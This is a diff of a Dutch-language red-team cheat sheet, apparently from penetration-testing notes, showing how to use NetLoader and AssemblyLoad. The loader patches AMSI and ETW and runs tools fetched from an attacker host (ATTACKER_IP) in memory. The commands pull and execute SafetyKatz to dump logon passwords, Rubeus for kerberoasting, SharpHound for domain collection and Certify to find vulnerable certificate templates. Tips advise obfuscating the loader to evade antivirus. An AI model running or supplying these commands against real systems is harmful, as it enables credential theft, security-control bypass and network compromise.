@@ -1,16 +1,16 @@
 # NetLoader - In-memory .NET assembly laden met AMSI+ETW bypass
 # NetLoader patcht automatisch AMSI en ETW voordat het payload laadt
 # === Enkele stage (NetLoader -> payload) ===
-C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/SafetyKatz.exe
+C:\Users\Public\Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe
 # Met argumenten aan payload doorgeven:
-C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/SafetyKatz.exe sekurlsa::logonpasswords exit
+C:\Users\Public\Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe sekurlsa::logonpasswords exit
 # === Dubbele stage (AssemblyLoad -> NetLoader -> payload) ===
 # AssemblyLoad laadt NetLoader in-memory, NetLoader laadt de echte payload
-C:\Users\Public\AssemblyLoad.exe http://10.0.0.1/tools/Loader.exe -path http://10.0.0.1/tools/SafetyKatz.exe
+C:\Users\Public\AssemblyLoad.exe http://ATTACKER_IP/tools/Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe
 # === Voorbeelden met andere payloads ===
-C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/Rubeus.exe kerberoast /stats
-C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/SharpHound.exe --CollectionMethods All
-C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/Certify.exe find /vulnerable
+C:\Users\Public\Loader.exe -path http://ATTACKER_IP/tools/Rubeus.exe kerberoast /stats
+C:\Users\Public\Loader.exe -path http://ATTACKER_IP/tools/SharpHound.exe --CollectionMethods All
+C:\Users\Public\Loader.exe -path http://ATTACKER_IP/tools/Certify.exe find /vulnerable
 # Tip: Niets raakt de schijf - alles in memory
 # Tip: Loader.exe zelf moet wel AV-proof zijn (obfuscate indien nodig)
 # Tip: AssemblyLoad = extra laag om Loader.exe ook in-memory te houden
